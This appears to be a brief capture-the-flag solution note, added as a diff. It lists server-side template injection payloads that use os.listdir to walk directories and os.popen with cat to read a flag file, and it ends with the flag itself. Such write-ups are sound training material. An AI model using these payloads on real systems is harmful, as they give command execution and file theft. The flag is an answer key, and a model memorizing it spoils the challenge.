@@ -1,0 +1,9 @@
+{{ os.listdir('.') }} lists all the direcotries 
+
+{{ os.listdir('vault') }} lists files inside vault
+
+{{ os.listdir('vault/level1/level2/level3/secret_room/deep/archive/more') }} running through direcotries
+
+{{ os.popen('cat vault/level1/level2/level3/secret_room/deep/archive/flag.txt').read() }}  is where the real flag is stored
+
+ctf7{ssti_exploited_007}
